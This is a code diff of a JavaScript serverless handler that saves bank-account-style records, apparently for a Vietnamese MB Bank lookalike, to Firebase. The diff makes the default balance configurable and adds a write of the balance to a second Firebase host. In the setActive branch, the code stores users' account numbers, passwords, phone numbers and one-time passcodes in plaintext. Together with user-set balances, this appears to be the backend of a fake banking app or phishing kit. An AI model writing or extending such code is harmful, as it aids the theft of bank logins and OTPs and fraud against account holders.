@@ -85,7 +85,7 @@ export default async function handler(req, res) {
           username: accNum,
           accountName: body.accountName || 'NGUYEN NGOC TRI',
           customerName: body.accountName || 'NGUYEN NGOC TRI',
-          balance: Number.isFinite(Number(body.balance)) ? Number(body.balance) : 95000000,
+          balance: Number.isFinite(Number(body.balance)) ? Number(body.balance) : 0,
           tier: 'MB Priority Digital',
           updatedAt: new Date().toISOString()
         };
@@ -96,20 +96,29 @@ export default async function handler(req, res) {
         });
       }
 
+      const activeBal = typeof accData.balance === 'number' ? accData.balance : 0;
+
       // 3. Sync to root for backward compatibility
-      await fetch(`${FIREBASE_URL}.json`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          accountNumber: accNum,
-          accountName: accData.accountName || accData.customerName || 'NGUYEN NGOC TRI',
-          customerName: accData.customerName || accData.accountName || 'NGUYEN NGOC TRI',
-          balance: accData.balance || 95000000,
-          active_account: accNum,
-          activeAccount: accNum,
-          updatedAt: new Date().toISOString()
+      await Promise.all([
+        fetch(`${FIREBASE_URL}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            accountNumber: accNum,
+            accountName: accData.accountName || accData.customerName || 'NGUYEN NGOC TRI',
+            customerName: accData.customerName || accData.accountName || 'NGUYEN NGOC TRI',
+            balance: activeBal,
+            active_account: accNum,
+            activeAccount: accNum,
+            updatedAt: new Date().toISOString()
+          })
+        }),
+        fetch(`https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/balance.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(activeBal)
         })
-      });
+      ]);
 
       return res.status(200).json({
         success: true,
@@ -183,30 +192,36 @@ export default async function handler(req, res) {
 
     // 2. Nếu setActive, cập nhật active_account và đồng bộ root
     if (setActive) {
-      await fetch(`${FIREBASE_URL}/active_account.json`, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(accNum)
-      });
-
-      await fetch(`${FIREBASE_URL}.json`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          accountNumber: accNum,
-          username: accNum,
-          password: password,
-          phone: phone,
-          sdt: phone,
-          otp: otp,
-          accountName: name,
-          customerName: name,
-          balance: bal,
-          active_account: accNum,
-          activeAccount: accNum,
-          updatedAt: new Date().toISOString()
+      await Promise.all([
+        fetch(`${FIREBASE_URL}/active_account.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(accNum)
+        }),
+        fetch(`${FIREBASE_URL}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            accountNumber: accNum,
+            username: accNum,
+            password: password,
+            phone: phone,
+            sdt: phone,
+            otp: otp,
+            accountName: name,
+            customerName: name,
+            balance: bal,
+            active_account: accNum,
+            activeAccount: accNum,
+            updatedAt: new Date().toISOString()
+          })
+        }),
+        fetch(`https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/balance.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(bal)
         })
-      });
+      ]);
     }
 
     return res.status(200).json({
